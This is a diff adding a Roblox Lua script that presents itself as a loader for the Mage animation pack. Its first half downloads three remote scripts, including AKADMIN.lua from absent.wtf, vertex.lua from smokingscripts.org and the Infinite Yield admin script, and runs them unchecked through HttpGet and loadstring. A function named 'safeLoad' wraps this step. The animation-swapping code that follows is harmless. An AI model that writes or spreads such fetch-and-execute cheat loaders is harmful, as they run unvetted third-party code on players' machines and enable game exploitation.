@@ -1,0 +1,95 @@
+-- List of external scripts to load sequentially
+local remoteScripts = {
+    "https://absent.wtf/AKADMIN.lua",
+    "https://raw.smokingscripts.org/vertex.lua",
+    "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
+}
+
+-- Safe Loader Function
+local function safeLoad(url)
+    local success, source = pcall(function()
+        return game:HttpGet(url)
+    end)
+    
+    if success and source then
+        local executable, err = loadstring(source)
+        if executable then
+            local runSuccess, runErr = pcall(executable)
+            if not runSuccess then
+                warn("Runtime error in " .. url .. ": " .. tostring(runErr))
+            end
+        else
+            warn("Syntax error in " .. url .. ": " .. tostring(err))
+        end
+    else
+        warn("Failed to fetch script from: " .. url)
+    end
+end
+
+-- 1. Execute Remote Scripts
+for _, url in ipairs(remoteScripts) do
+    safeLoad(url)
+    task.wait(0.2)
+end
+
+-- 2. Mage Animation Pack Logic
+local animations = {
+    idle = "rbxassetid://707742142",
+    idleAlt = "rbxassetid://707855907",
+    walk = "rbxassetid://707861613",
+    run = "rbxassetid://707861613",
+    jump = "rbxassetid://707865869",
+    fall = "rbxassetid://707829716",
+    swim = "rbxassetid://707876443",
+    swimIdle = "rbxassetid://707894699",
+    climb = "rbxassetid://707826056"
+}
+
+local player = game.Players.LocalPlayer
+
+local function applyAnimations(character)
+    local animateScript = character:WaitForChild("Animate", 10)
+    if not animateScript then return end
+
+    for animationType, animationId in pairs(animations) do
+        if animateScript:FindFirstChild(animationType) then
+            for _, anim in ipairs(animateScript[animationType]:GetChildren()) do
+                if anim:IsA("Animation") then
+                    anim.AnimationId = animationId
+                end
+            end
+        end
+    end
+
+    -- Handle Alt Idle specifically
+    local idle = animateScript:FindFirstChild("idle")
+    if idle then
+        local animAlt = idle:FindFirstChild("Animation2")
+        if animAlt then
+            animAlt.AnimationId = animations.idleAlt
+        end
+    end
+end
+
+local function setupLoop(character)
+    local humanoid = character:WaitForChild("Humanoid", 10)
+    if not humanoid then return end
+
+    humanoid.AnimationPlayed:Connect(function(track)
+        track.Looped = true
+    end)
+end
+
+local function onCharacterAdded(character)
+    applyAnimations(character)
+    setupLoop(character)
+end
+
+-- Initialize for current character and future spawns
+if player.Character then
+    onCharacterAdded(player.Character)
+end
+
+player.CharacterAdded:Connect(onCharacterAdded)
+
+print("System Initialized: 3 Scripts Loaded & Animations Applied.")
